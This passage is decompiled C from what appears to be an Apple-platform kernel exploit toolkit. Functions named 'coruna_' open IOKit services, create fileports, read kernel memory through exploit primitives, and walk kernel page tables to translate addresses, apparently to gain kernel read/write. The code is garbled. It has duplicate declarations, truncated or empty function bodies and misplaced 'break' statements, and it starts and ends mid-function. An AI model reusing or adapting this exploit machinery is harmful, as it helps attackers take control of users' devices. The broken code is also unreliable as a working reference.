  scratch.st_mode = 0;
  scratch.st_nlink = 0;
  ptr = (char *)*val;
  err = _stat(ptr,&scratch);
  if (err == 0) {
    if ((scratch.st_mode & 0xf000) != 0x6000) {
      size = 0xad013;
      ptr = (uint *)0x0;
      *(uint *)(val + 2) = size;
      return ptr;
    }
    err = _open(ptr,0);
    if (-1 < err) {
      status = _ioctl(err,0x20006415);
      if (status == 0) {
        size = 0;
      }
      else {
        err = ___error();
        status = *err;
        ptr = (uint *)___error();
        size = -*ptr;
        if (-1 < status) {
          size = *ptr;
        }
        size = size | 0x40000000;
      }
      u = _close(err);
      ptr = (uint *)(unsigned long)u;
      *(uint *)(val + 2) = size;
      return ptr;
    }
  }
  else {
    ptr = (uint *)___error();
    if (*ptr == 2) {
      size = 0;
      *(uint *)(val + 2) = size;
      return ptr;
    }
  }
  err = ___error();
  err = *err;
  ptr = (uint *)___error();
  size = -*ptr;
  if (-1 < err) {
    size = *ptr;
  }
  size = size | 0x40000000;
fail:
  *(uint *)(val + 2) = size;
  return ptr;
}





void coruna_ioconnectcallstructmethod_176b4(uint64_t *val)
{
  uint u;
  uint size;
  uint64_t version;
  uint32_t scratch;
  uint64_t bootargs;
  uint32_t thread_attr;
  uint64_t host_info;
  char *serial_buf;
  size_t action;
  uint64_t block_ctx;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t stack_guard;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t sa_saved;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t region;
  uint64_t plist;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t frame;
  uint64_t work;
  long cache;
  
  cache = *(long *)k_kernel_stack_chk_guard_slot;
  if (val != (uint64_t *)0x0) {
    version = coruna_ioservicegetmatchingservice_1bb7c("IOHDIXController");
    if ((int)version + 1U < 2) {
      *(uint32_t *)(val + 1) = 0xad011;
    }
    else {
      thread_attr = 0;
      u = _IOServiceOpen(version,*(uint32_t *)k_kernel_mach_task_self_slot,0,&thread_attr);
      if (u == 0) {
        bootargs = 4;
        scratch = 0;
        scratch = 0;
        block_ctx = 0;
        thread_attr = 0;
        bootargs = 0;
        host_info = 0;
        stack_guard = 0;
        action = 0;
        serial_buf = 0;
        block_ctx = 0;
        sa_saved = 0;
        sa_saved = 0;
        stack_guard = 0;
        sa_new = 0;
        sa_new = 0;
        path_buf = 0;
        path_buf = 0;
        tmp_buf = 0;
        tmp_buf = 0;
        region = 0;
        region = 0;
        plist = 0;
        plist = 0;
        url_buf = 0;
        url_buf = 0;
        json_buf = 0;
        json_buf = 0;
        frame = 0;
        frame = 0;
        work = 0;
        host_info = k_kernel_rodata_word_374d8;
        serial_buf = (char *)*val;
        action = _strlen(serial_buf);
        size = _IOConnectCallStructMethod(thread_attr,0,&host_info,0x100,&scratch,&bootargs);
        u = 0;
        if (size != 0) {
          u = size | 0x80000000;
        }
        *(uint *)(val + 1) = u;
        _IOServiceClose(thread_attr);
      }
      else {
        *(uint *)(val + 1) = u | 0x80000000;
      }
      _IOObjectRelease(version);
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == cache) {
    return;
  }
  ___stack_chk_fail();
}





void coruna_ioregistryentrycreatecfproperty(uint64_t *val,uint64_t id_2)
{
  int err;
  uint64_t u;
  long handle;
  long addr;
  long off;
  long base;
  uint64_t size;
  char *ptr;
  uint64_t version;
  long scratch;
  char bootargs [136];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 0;
  bootargs[0x68] = '\0';
  bootargs[0x69] = '\0';
  bootargs[0x6a] = '\0';
  bootargs[0x6b] = '\0';
  bootargs[0x6c] = '\0';
  bootargs[0x6d] = '\0';
  bootargs[0x6e] = '\0';
  bootargs[0x6f] = '\0';
  bootargs[0x60] = '\0';
  bootargs[0x61] = '\0';
  bootargs[0x62] = '\0';
  bootargs[99] = '\0';
  bootargs[100] = '\0';
  bootargs[0x65] = '\0';
  bootargs[0x66] = '\0';
  bootargs[0x67] = '\0';
  bootargs[0x78] = '\0';
  bootargs[0x79] = '\0';
  bootargs[0x7a] = '\0';
  bootargs[0x7b] = '\0';
  bootargs[0x7c] = '\0';
  bootargs[0x7d] = '\0';
  bootargs[0x7e] = '\0';
  bootargs[0x7f] = '\0';
  bootargs[0x70] = '\0';
  bootargs[0x71] = '\0';
  bootargs[0x72] = '\0';
  bootargs[0x73] = '\0';
  bootargs[0x74] = '\0';
  bootargs[0x75] = '\0';
  bootargs[0x76] = '\0';
  bootargs[0x77] = '\0';
  bootargs[0x48] = '\0';
  bootargs[0x49] = '\0';
  bootargs[0x4a] = '\0';
  bootargs[0x4b] = '\0';
  bootargs[0x4c] = '\0';
  bootargs[0x4d] = '\0';
  bootargs[0x4e] = '\0';
  bootargs[0x4f] = '\0';
  bootargs[0x40] = '\0';
  bootargs[0x41] = '\0';
  bootargs[0x42] = '\0';
  bootargs[0x43] = '\0';
  bootargs[0x44] = '\0';
  bootargs[0x45] = '\0';
  bootargs[0x46] = '\0';
  bootargs[0x47] = '\0';
  bootargs[0x58] = '\0';
  bootargs[0x59] = '\0';
  bootargs[0x5a] = '\0';
  bootargs[0x5b] = '\0';
  bootargs[0x5c] = '\0';
  bootargs[0x5d] = '\0';
  bootargs[0x5e] = '\0';
  bootargs[0x5f] = '\0';
  bootargs[0x50] = '\0';
  bootargs[0x51] = '\0';
  bootargs[0x52] = '\0';
  bootargs[0x53] = '\0';
  bootargs[0x54] = '\0';
  bootargs[0x55] = '\0';
  bootargs[0x56] = '\0';
  bootargs[0x57] = '\0';
  bootargs[0x28] = '\0';
  bootargs[0x29] = '\0';
  bootargs[0x2a] = '\0';
  bootargs[0x2b] = '\0';
  bootargs[0x2c] = '\0';
  bootargs[0x2d] = '\0';
  bootargs[0x2e] = '\0';
  bootargs[0x2f] = '\0';
  bootargs[0x20] = '\0';
  bootargs[0x21] = '\0';
  bootargs[0x22] = '\0';
  bootargs[0x23] = '\0';
  bootargs[0x24] = '\0';
  bootargs[0x25] = '\0';
  bootargs[0x26] = '\0';
  bootargs[0x27] = '\0';
  bootargs[0x38] = '\0';
  bootargs[0x39] = '\0';
  bootargs[0x3a] = '\0';
  bootargs[0x3b] = '\0';
  bootargs[0x3c] = '\0';
  bootargs[0x3d] = '\0';
  bootargs[0x3e] = '\0';
  bootargs[0x3f] = '\0';
  bootargs[0x30] = '\0';
  bootargs[0x31] = '\0';
  bootargs[0x32] = '\0';
  bootargs[0x33] = '\0';
  bootargs[0x34] = '\0';
  bootargs[0x35] = '\0';
  bootargs[0x36] = '\0';
  bootargs[0x37] = '\0';
  bootargs[8] = '\0';
  bootargs[9] = '\0';
  bootargs[10] = '\0';
  bootargs[0xb] = '\0';
  bootargs[0xc] = '\0';
  bootargs[0xd] = '\0';
  bootargs[0xe] = '\0';
  bootargs[0xf] = '\0';
  bootargs[0] = '\0';
  bootargs[1] = '\0';
  bootargs[2] = '\0';
  bootargs[3] = '\0';
  bootargs[4] = '\0';
  bootargs[5] = '\0';
  bootargs[6] = '\0';
  bootargs[7] = '\0';
  bootargs[0x18] = '\0';
  bootargs[0x19] = '\0';
  bootargs[0x1a] = '\0';
  bootargs[0x1b] = '\0';
  bootargs[0x1c] = '\0';
  bootargs[0x1d] = '\0';
  bootargs[0x1e] = '\0';
  bootargs[0x1f] = '\0';
  bootargs[0x10] = '\0';
  bootargs[0x11] = '\0';
  bootargs[0x12] = '\0';
  bootargs[0x13] = '\0';
  bootargs[0x14] = '\0';
  bootargs[0x15] = '\0';
  bootargs[0x16] = '\0';
  bootargs[0x17] = '\0';
  u = _IOIteratorNext(id_2);
  if ((int)u != 0) {
    version = *(uint64_t *)k_kernel_kcfallocatordefault_slot;
    do {
      handle = _IORegistryEntrySearchCFProperty(u,"IOService",&cf_ota_unique_identifier,version,3);
      if (handle != 0) {
        addr = _CFGetTypeID();
        off = _CFNumberGetTypeID();
        if ((((addr == off) && (err = _CFNumberGetValue(handle,4,&scratch), err == 1)) &&
            (scratch == val[1])) &&
           (addr = _IORegistryEntryCreateCFProperty(u,&cf_BSDName,version,0), addr != 0)) {
          off = _CFGetTypeID();
          base = _CFStringGetTypeID();
          if (off == base) {
            size = _CFStringGetSystemEncoding();
            err = _CFStringGetCString(addr,bootargs,0x80,size);
            if (err == 1) {
              if ((void *)*val != (void *)0x0) {
                _free((void *)*val);
              }
              ptr = _strdup(bootargs);
              *val = ptr;
            }
          }
          _CFRelease(addr);
        }
        _CFRelease(handle);
      }
      _IOObjectRelease(u);
      u = _IOIteratorNext(id_2);
    } while ((int)u != 0);
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail();
}





uint32_t coruna_fileport_makeport_179b0(long handle,uint64_t val)
{
  int err;
  long handle;
  uint32_t u;
  int scratch;
  uint32_t bootargs;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f53) {
    if (err != 0x1809 && err != 0x1c1b) {
      return 0x28007;
    }
  }
  else if (1 < err - 0x1f53U && err != 0x2258) {
    return 0x28007;
  }
  err = _fileport_makeport(val,&bootargs);
  if (err == 0) {
    handle = coruna_kernel600c_via_return_zero_28118(handle,bootargs);
    if (handle == 0) {
      u = 0x2800e;
    }
    else {
      err = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,handle + 0x14,&scratch);
      if (err == 0) {
        u = 0x2800f;
      }
      else if (scratch - 1U < 10) {
        err = coruna_mach_vm_machine_attribute(handle,handle + 0x14,0xffff);
        u = 0x28010;
        if (err != 0) {
          u = 0;
        }
      }
      else {
        u = 0x28011;
      }
    }
  }
  else {
    u = 0x2800d;
  }
  return u;
}





void coruna_mach_absolute_time(long handle)
{
  uint64_t *ptr;
  unsigned long u;
  uint64_t size;
  long handle;
  
  handle = *(long *)(handle + 0x868);
  size = _mach_absolute_time();
  if (handle != 0) {
    u = 0;
    if ((unsigned long)*(uint *)(handle + 0x260) != 0) {
      u = ((size - *(long *)(handle + 0x868)) * (unsigned long)*(uint *)(handle + 0x25c)) /
              (unsigned long)*(uint *)(handle + 0x260);
    }
    if (u < 0x12a153440) {
      return;
    }
    handle = 0;
    do {
      ptr = (uint64_t *)(handle + 0x5e8 + handle);
      ptr[4] = 0;
      ptr[1] = 0;
      *ptr = 0;
      ptr[3] = 0;
      ptr[2] = 0;
      handle = handle + 0x28;
    } while (handle != 0x280);
    size = _mach_absolute_time();
  }
  *(uint64_t *)(handle + 0x868) = size;
  return;
}





void coruna_kernel600c_via_return_zero_29fc4(uint64_t val)
{
  long handle;
  
  handle = coruna_kernel600c_via_return_zero_28118_2();
  if (handle != 0) {
    coruna_return_zero_29fc4(val,handle);
    return;
  }
  return;
}





uint64_t coruna_kernel600c_via_return_zero_2d590(long handle,unsigned long arg,long *addr_2,uint64_t val)
{
  int err;
  uint64_t u;
  long handle;
  uint32_t size;
  uint8_t version;
  uint port;
  unsigned long tag;
  long addr;
  uint64_t kind;
  long off;
  long base;
  uint64_t scratch;
  unsigned long bootargs;
  
  u = 0;
  if (addr_2 != (long *)0x0) {
    do {
    addr = 0;
    addr_2[4] = 0;
    addr_2[1] = 0;
    *addr_2 = 0;
    addr_2[3] = 0;
    addr_2[2] = 0;
    do {
      handle = *(long *)(handle + addr + 0x5e8);
      if (handle == 0) break;
      tag = *(unsigned long *)(handle + addr + 0x5f0);
      if ((tag <= arg) && (arg < tag + *(uint *)(handle + addr + 0x5f8))) {
        err = coruna_kernel600c_via_kernel600c_via_fd_read_full_3(handle,handle,8,handle + addr + 0x608,val);
        if (err != 0) {
          handle = handle + addr;
          handle = *(long *)(handle + 0x5f0);
          addr = *(long *)(handle + 0x5e8);
          base = *(long *)(handle + 0x600);
          off = *(long *)(handle + 0x5f8);
          addr_2[4] = *(long *)(handle + 0x608);
          addr_2[1] = handle;
          *addr_2 = addr;
          addr_2[3] = base;
          addr_2[2] = off;
          return 1;
        }
        break;
      }
      addr = addr + 0x28;
    } while (addr != 0x280);
    if (*(long *)(handle + 0x5d0) == 0) {
      addr = coruna_kernel600c_via_return_zero_29fc4(handle);
      if (((addr == 0) || (err = coruna_kernel600c_residual_193(handle,addr,&bootargs), err == 0)) ||
         (err = coruna_kernel600c_residual_193(handle,addr + *(int *)(handle + 0x168),&scratch), err == 0))
      break;
    }
    if ((*(int *)(handle + 0x180) == 0x1000) || (err = coruna_ctx_test_flag(handle,0x8000), err != 0))
    {
      handle = *(long *)(handle + 0x5d0);
      kind = *(uint64_t *)(handle + 0x5d8);
      addr = coruna_return_zero_2d590(handle,handle,kind,kind);
      tag = arg >> 0x1b & 0x7f8;
      u = coruna_kernel600c_via_kernel600c_via_fd_read_full_3(handle,handle + tag,8,&bootargs,val);
      if ((int)u != 0) {
        if ((bootargs & 3) == 0) u = 0; break;
        if ((bootargs & 3) == 1) {
          addr = addr + tag;
          size = 0x40000000;
          tag = 0xffffffffc0000000;
          version = 1;
        }
        else {
          if ((bootargs >> 0x3b & 1) != 0) {
            *(uint *)((long)addr_2 + 0x14) = *(uint *)((long)addr_2 + 0x14) | 0x100;
          }
          addr = coruna_return_zero_2d590(handle,handle,kind,bootargs & 0xfffffffff000);
          addr = addr + (arg >> 0x12 & 0xff8);
          u = coruna_kernel600c_via_kernel600c_via_fd_read_full_3(handle,addr,8,&bootargs,val);
          if ((int)u == 0) break;
          if ((bootargs & 3) == 0) u = 0; break;
          if ((bootargs & 3) == 1) {
            size = 0x200000;
            tag = 0xffffffffffe00000;
            version = 1;
          }
          else {
            if ((bootargs >> 0x3b & 1) != 0) {
              *(uint *)((long)addr_2 + 0x14) = *(uint *)((long)addr_2 + 0x14) | 0x100;
            }
            addr = coruna_return_zero_2d590(handle,handle,kind,bootargs & 0xfffffffff000);
            addr = addr + (arg >> 9 & 0xff8);
            u = coruna_kernel600c_via_kernel600c_via_fd_read_full_3(handle,addr,8,&bootargs,val);
            if ((int)u == 0) break;
            if ((~(uint)bootargs & 3) != 0) u = 0; break;
            version = 3;
            size = 0x1000;
            tag = 0xfffffffffffff000;
          }
        }
        *addr_2 = addr;
check_ok:
        addr_2[1] = tag & arg;
        *(uint32_t *)(addr_2 + 2) = size;
        *(uint8_t *)((long)addr_2 + 0x14) = version;
        addr_2[4] = bootargs;
        port = 3;
        if ((bootargs & 0x80) != 0) {
          port = 1;
        }
        *(uint *)(addr_2 + 3) = ((uint)(bootargs >> 0x33) & 4 | port) ^ 4;
        u = 1;
      }
    }
    else {
      if (*(int *)(handle + 0x180) != 0x4000) break;
      addr = *(long *)(handle + 0x5d0);
      kind = *(uint64_t *)(handle + 0x5d8);
      err = coruna_ctx_test_flag(handle,0x5000008);
      tag = 7;
      if (err != 0) {
        tag = 0x7ff;
      }
      u = coruna_kernel600c_via_kernel600c_via_fd_read_full_3(handle,addr + (tag & arg >> 0x24) * 8,8,&bootargs,val);
      if ((int)u != 0) {
        if ((~(uint)bootargs & 3) == 0) {
          if ((bootargs >> 0x3b & 1) != 0) {
            *(uint *)((long)addr_2 + 0x14) = *(uint *)((long)addr_2 + 0x14) | 0x100;
          }
          handle = coruna_return_zero_2d590(handle,addr,kind,bootargs & 0xffffffffc000);
          handle = handle + (arg >> 0x16 & 0x3ff8);
          u = coruna_kernel600c_via_kernel600c_via_fd_read_full_3(handle,handle,8,&bootargs,val);
          if ((int)u == 0) break;
          if ((bootargs & 3) != 0) {
            if ((bootargs & 3) == 1) {
              size = 0x2000000;
              tag = 0xfffffffffe000000;
              version = 1;
            }
            else {
              if ((bootargs >> 0x3b & 1) != 0) {
                *(uint *)((long)addr_2 + 0x14) = *(uint *)((long)addr_2 + 0x14) | 0x100;
              }
              handle = coruna_return_zero_2d590(handle,addr,kind,bootargs & 0xffffffffc000);
              handle = handle + (arg >> 0xb & 0x3ff8);
              u = coruna_kernel600c_via_kernel600c_via_fd_read_full_3(handle,handle,8,&bootargs,val);
              if ((int)u == 0) break;
              if ((~(uint)bootargs & 3) != 0) u = 0; break;
              version = 3;
              size = 0x4000;
              tag = 0xffffffffffffc000;
            }
            *addr_2 = handle;
            /* fall through */
          }
        }
      }
    }
cleanup:
    if ((int)u != 0) {
      addr = 0;
      do {
        if (*(long *)(handle + 0x5e8 + addr) == 0) {
          handle = handle + addr;
          handle = addr_2[1];
          addr = *addr_2;
          base = addr_2[3];
          off = addr_2[2];
          *(long *)(handle + 0x608) = addr_2[4];
          *(long *)(handle + 0x5f0) = handle;
          *(long *)(handle + 0x5e8) = addr;
          *(long *)(handle + 0x600) = base;
          *(long *)(handle + 0x5f8) = off;
          return u;
        }
        addr = addr + 0x28;
      } while (addr != 0x280);
    }
    } while (0);
  }
  return u;
}





void coruna_call_mach_vm_machine_attribute_29df8_17fcc(void)
{
  coruna_kernel600c_via_return_zero_2d590();
  return;
}





uint64_t coruna_free_17fd4(uint64_t val,uint64_t *id_2)
{
  if (id_2 != (uint64_t *)0x0) {
    if ((void *)id_2[3] != (void *)0x0) {
      _free((void *)id_2[3]);
    }
    id_2[1] = 0;
    *id_2 = 0;
    id_2[3] = 0;
    id_2[2] = 0;
    _free(id_2);
    return 0;
  }
  return 0xad001;
}
int coruna_kernel600c_str_00_e4_00_20_01_00_ad_5f_01_00_f9(long handle,uint64_t *val)
{
  uint *ptr;
  void **lppv2;
  char *ptr;
  uint u;
  uint size;
  uint version;
  void *ptr;
  int err;
  int status;
  uint64_t *buf;
  void *buf;
  void *str;
  long handle;
  uint64_t port;
  void *copy;
  uint tag;
  unsigned long kind;
  void *data;
  unsigned long type_id;
  uint64_t type_id_8;
  uint64_t type_id_9;
  void *scratch;
  int bootargs;
  uint32_t scratch;
  long thread_attr;
  void *host_info;
  long serial_buf;
  long action;
  long block_ctx;
  long stack_guard;
  uint32_t sa_saved;
  uint32_t bootargs;
  uint32_t sa_new;
  uint32_t thread_attr;
  uint32_t host_info;
  uint serial_buf;
  void *path_buf;
  long tmp_buf;
  long region;
  uint32_t action;
  uint32_t block_ctx;
  uint32_t plist;
  uint32_t stack_guard;
  uint32_t sa_saved;
  uint url_buf;
  long json_buf;
  
  json_buf = *(long *)k_kernel_stack_chk_guard_slot;
  status = 0xad009;
  buf = _calloc(0x20,1);
  if (*(long *)k_kernel_stack_chk_guard_slot == json_buf) {
  return status;
  }
  ___stack_chk_fail();
}





bool coruna_modinfo_string_match(uint64_t val,long handle,void *ctx,uint size)
{
  int err;
  bool err;
  int status;
  unsigned long u;
  long handle;
  unsigned long size;
  
  if ((((handle == 0) || (handle = *(long *)(handle + 0x18), handle == 0)) ||
      (u = (unsigned long)*(uint *)(handle + 0x10), *(uint *)(handle + 0x10) == 0)) ||
     (*(uint *)(handle + 8) != size)) {
    err = false;
  }
  else {
    size = 0;
    err = *(int *)(handle + 0xc);
    do {
      u = u - 1;
      status = _memcmp((void *)(handle + size),ctx,(unsigned long)size);
      err = status == 0;
      size = (unsigned long)((int)size + err + size);
    } while (status != 0 && u != 0);
  }
  return err;
}





uint64_t coruna_qsort(uint64_t val,long handle,void *ctx,unsigned long arg)
{
  int err;
  int status;
  uint u;
  unsigned long size;
  int *err;
  uint64_t version;
  void *ptr;
  long handle;
  
  version = 0xad001;
  if (((handle != 0) && (handle = *(long *)(handle + 0x18), handle != 0)) &&
     (*(int *)(handle + 8) == (int)arg)) {
    size = coruna_modinfo_string_match(val,handle,ctx,arg);
    if ((size & 1) == 0) {
      if (0x3ff < *(uint *)(handle + 0x10)) {
        return 0xad00c;
      }
      ptr = (void *)(handle + (unsigned long)((*(int *)(handle + 0xc) + (int)arg) *
                                       *(uint *)(handle + 0x10)));
      _memcpy(ptr,ctx,arg & 0xffffffff);
      *(int *)(handle + 0x10) = *(int *)(handle + 0x10) + 1;
      if (*(int *)(handle + 0xc) == 2) {
        *(uint8_t *)((long)ptr + (unsigned long)*(uint *)(handle + 8)) = 2;
        *(uint8_t *)((long)ptr + (unsigned long)(*(int *)(handle + 8) + 1)) = 0;
      }
      ptr = *(void **)(handle + 0x18);
      if (ptr == (void *)0x0) {
        return 0xad001;
      }
      u = *(uint *)(handle + 0x10);
      if (u == 0) {
        return 0;
      }
      err = *(int *)(handle + 8);
      status = *(int *)(handle + 0xc);
      err = (int *)coruna_fn_ptr_cast(coruna_return_zero_18ea0);
      _qsort(ptr,(unsigned long)u,(unsigned long)(uint)(status + err),err);
    }
    version = 0;
  }
  return version;
}





uint32_t coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8_1e994(long handle,long *addr_2)
{
  long handle;
  int err;
  uint32_t u;
  unsigned long size;
  
  u = 0xad001;
  if (((addr_2 != (long *)0x0) && (addr_2[3] != 0)) && (*addr_2 != 0)) {
    size = *(unsigned long *)(handle + 0x158) >> 0x2b;
    handle = 0x40;
    if (size < 1099) {
      handle = 0x30;
    }
    err = coruna_call_mach_vm_machine_attribute_29df8_1e994(handle,handle + *addr_2,addr_2[3],
                         (*(int *)((long)addr_2 + 0xc) + (int)addr_2[1]) * (int)addr_2[2]);
    u = 0x28010;
    if (err != 0) {
      handle = 0x3c;
      if (size < 1099) {
        handle = 0x2c;
      }
      err = coruna_mach_vm_machine_attribute(handle,*addr_2 + handle,(int)addr_2[2]);
      u = 0x28010;
      if (err != 0) {
        u = 0;
      }
    }
  }
  return u;
}





bool coruna_kernel600c_via_free_17fd4(uint64_t val,uint size,int flags,long handle)
{
  uint64_t u;
  uint64_t size;
  int err;
  unsigned long version;
  uint64_t scratch;
  
  scratch = 0;
  if (flags == 0x14) {
    size = coruna_kernel600c_str_00_e4_00_20_01_00_ad_5f_01_00_f9(val,&scratch);
    u = scratch;
    err = (int)size;
    if (err == 0) {
      if (size != 0) {
        version = 0;
        do {
          size = coruna_qsort(size,u,handle + (version & 0xfffffffc),0x14);
          if ((int)size != 0) goto fail;
          version = version + 0x14;
        } while ((unsigned long)size * 0x14 - version != 0);
      }
      size = coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8_1e994(val,u);
fail:
      err = (int)size;
      coruna_free_17fd4(size,u);
    }
  }
  else {
    err = 0xad001;
  }
  return err == 0;
}





void coruna_kernel600c_via_kernel600c_via_free_17fd4(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  coruna_kernel600c_via_free_17fd4(val,1,size_3,id_2);
  return;
}





uint64_t coruna_return_zero_18ea0(long handle,long addr_2)
{
  long handle;
  
  handle = 0;
  while( true ) {
    if (*(byte *)(handle + handle) < *(byte *)(addr_2 + handle)) {
      return 0xffffffff;
    }
    if (*(byte *)(addr_2 + handle) < *(byte *)(handle + handle)) break;
    handle = handle + 1;
    if (handle == 0x14) {
      return 0;
    }
  }
  return 1;
}





uint64_t coruna_ioregistryentrycreatecfproperty_18b50(uint64_t *val,uint size)
{
  byte err;
  uint u;
  uint64_t size;
  long handle;
  long addr;
  long off;
  long base;
  unsigned long version;
  byte *ptr;
  char *ptr;
  uint64_t port;
  char scratch [776];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  scratch[0x2e8] = '\0';
  scratch[0x2e9] = '\0';
  scratch[0x2ea] = '\0';
  scratch[0x2eb] = '\0';
  scratch[0x2ec] = '\0';
  scratch[0x2ed] = '\0';
  scratch[0x2ee] = '\0';
  scratch[0x2ef] = '\0';
  scratch[0x2e0] = '\0';
  scratch[0x2e1] = '\0';
  scratch[0x2e2] = '\0';
  scratch[0x2e3] = '\0';
  scratch[0x2e4] = '\0';
  scratch[0x2e5] = '\0';
  scratch[0x2e6] = '\0';
  scratch[0x2e7] = '\0';
  scratch[0x2f8] = '\0';
  scratch[0x2f9] = '\0';
  scratch[0x2fa] = '\0';
  scratch[0x2fb] = '\0';
  scratch[0x2fc] = '\0';
  scratch[0x2fd] = '\0';
  scratch[0x2fe] = '\0';
  scratch[0x2ff] = '\0';
  scratch[0x2f0] = '\0';
  scratch[0x2f1] = '\0';
  scratch[0x2f2] = '\0';
  scratch[0x2f3] = '\0';
  scratch[0x2f4] = '\0';
  scratch[0x2f5] = '\0';
  scratch[0x2f6] = '\0';
  scratch[0x2f7] = '\0';
  scratch[0x2c8] = '\0';
  scratch[0x2c9] = '\0';
  scratch[0x2ca] = '\0';
  scratch[0x2cb] = '\0';
  scratch[0x2cc] = '\0';
  scratch[0x2cd] = '\0';
  scratch[0x2ce] = '\0';
  scratch[0x2cf] = '\0';
  scratch[0x2c0] = '\0';
  scratch[0x2c1] = '\0';
  scratch[0x2c2] = '\0';
  scratch[0x2c3] = '\0';
  scratch[0x2c4] = '\0';
  scratch[0x2c5] = '\0';
  scratch[0x2c6] = '\0';
  scratch[0x2c7] = '\0';
  scratch[0x2d8] = '\0';
  scratch[0x2d9] = '\0';
  scratch[0x2da] = '\0';
  scratch[0x2db] = '\0';
  scratch[0x2dc] = '\0';
  scratch[0x2dd] = '\0';
  scratch[0x2de] = '\0';
  scratch[0x2df] = '\0';
  scratch[0x2d0] = '\0';
  scratch[0x2d1] = '\0';
  scratch[0x2d2] = '\0';
  scratch[0x2d3] = '\0';
  scratch[0x2d4] = '\0';
  scratch[0x2d5] = '\0';
  scratch[0x2d6] = '\0';
  scratch[0x2d7] = '\0';
  scratch[0x2a8] = '\0';
  scratch[0x2a9] = '\0';
  scratch[0x2aa] = '\0';
  scratch[0x2ab] = '\0';
  scratch[0x2ac] = '\0';
  scratch[0x2ad] = '\0';
  scratch[0x2ae] = '\0';
  scratch[0x2af] = '\0';
  scratch[0x2a0] = '\0';
  scratch[0x2a1] = '\0';
  scratch[0x2a2] = '\0';
  scratch[0x2a3] = '\0';
  scratch[0x2a4] = '\0';
  scratch[0x2a5] = '\0';
  scratch[0x2a6] = '\0';
  scratch[0x2a7] = '\0';
  scratch[0x2b8] = '\0';
  scratch[0x2b9] = '\0';
  scratch[0x2ba] = '\0';
  scratch[699] = '\0';
  scratch[700] = '\0';
  scratch[0x2bd] = '\0';
  scratch[0x2be] = '\0';
  scratch[0x2bf] = '\0';
  scratch[0x2b0] = '\0';
  scratch[0x2b1] = '\0';
  scratch[0x2b2] = '\0';
  scratch[0x2b3] = '\0';
  scratch[0x2b4] = '\0';
  scratch[0x2b5] = '\0';
  scratch[0x2b6] = '\0';
  scratch[0x2b7] = '\0';
  scratch[0x288] = '\0';
  scratch[0x289] = '\0';
  scratch[0x28a] = '\0';
  scratch[0x28b] = '\0';
  scratch[0x28c] = '\0';
  scratch[0x28d] = '\0';
  scratch[0x28e] = '\0';
  scratch[0x28f] = '\0';
  scratch[0x280] = '\0';
  scratch[0x281] = '\0';
  scratch[0x282] = '\0';
  scratch[0x283] = '\0';
  scratch[0x284] = '\0';
  scratch[0x285] = '\0';
  scratch[0x286] = '\0';
  scratch[0x287] = '\0';
  scratch[0x298] = '\0';
  scratch[0x299] = '\0';
  scratch[0x29a] = '\0';
  scratch[0x29b] = '\0';
  scratch[0x29c] = '\0';
  scratch[0x29d] = '\0';
  scratch[0x29e] = '\0';
  scratch[0x29f] = '\0';
  scratch[0x290] = '\0';
  scratch[0x291] = '\0';
  scratch[0x292] = '\0';
  scratch[0x293] = '\0';
  scratch[0x294] = '\0';
  scratch[0x295] = '\0';
  scratch[0x296] = '\0';
  scratch[0x297] = '\0';
  scratch[0x268] = '\0';
  scratch[0x269] = '\0';
  scratch[0x26a] = '\0';
  scratch[0x26b] = '\0';
  scratch[0x26c] = '\0';
  scratch[0x26d] = '\0';
  scratch[0x26e] = '\0';
  scratch[0x26f] = '\0';
  scratch[0x260] = '\0';
  scratch[0x261] = '\0';
  scratch[0x262] = '\0';
  scratch[0x263] = '\0';
  scratch[0x264] = '\0';
  scratch[0x265] = '\0';
  scratch[0x266] = '\0';
  scratch[0x267] = '\0';
  scratch[0x278] = '\0';
  scratch[0x279] = '\0';
  scratch[0x27a] = '\0';
  scratch[0x27b] = '\0';
  scratch[0x27c] = '\0';
  scratch[0x27d] = '\0';
  scratch[0x27e] = '\0';
  scratch[0x27f] = '\0';
  scratch[0x270] = '\0';
  scratch[0x271] = '\0';
  scratch[0x272] = '\0';
  scratch[0x273] = '\0';
  scratch[0x274] = '\0';
  scratch[0x275] = '\0';
  scratch[0x276] = '\0';
  scratch[0x277] = '\0';
  scratch[0x248] = '\0';
  scratch[0x249] = '\0';
  scratch[0x24a] = '\0';
  scratch[0x24b] = '\0';
  scratch[0x24c] = '\0';
  scratch[0x24d] = '\0';
  scratch[0x24e] = '\0';
  scratch[0x24f] = '\0';
  scratch[0x240] = '\0';
  scratch[0x241] = '\0';
  scratch[0x242] = '\0';
  scratch[0x243] = '\0';
  scratch[0x244] = '\0';
  scratch[0x245] = '\0';
  scratch[0x246] = '\0';
  scratch[0x247] = '\0';
  scratch[600] = '\0';
  scratch[0x259] = '\0';
  scratch[0x25a] = '\0';
  scratch[0x25b] = '\0';
  scratch[0x25c] = '\0';
  scratch[0x25d] = '\0';
  scratch[0x25e] = '\0';
  scratch[0x25f] = '\0';
  scratch[0x250] = '\0';
  scratch[0x251] = '\0';
  scratch[0x252] = '\0';
  scratch[0x253] = '\0';
  scratch[0x254] = '\0';
  scratch[0x255] = '\0';
  scratch[0x256] = '\0';
  scratch[599] = '\0';
  scratch[0x228] = '\0';
  scratch[0x229] = '\0';
  scratch[0x22a] = '\0';
  scratch[0x22b] = '\0';
  scratch[0x22c] = '\0';
  scratch[0x22d] = '\0';
  scratch[0x22e] = '\0';
  scratch[0x22f] = '\0';
  scratch[0x220] = '\0';
  scratch[0x221] = '\0';
  scratch[0x222] = '\0';
  scratch[0x223] = '\0';
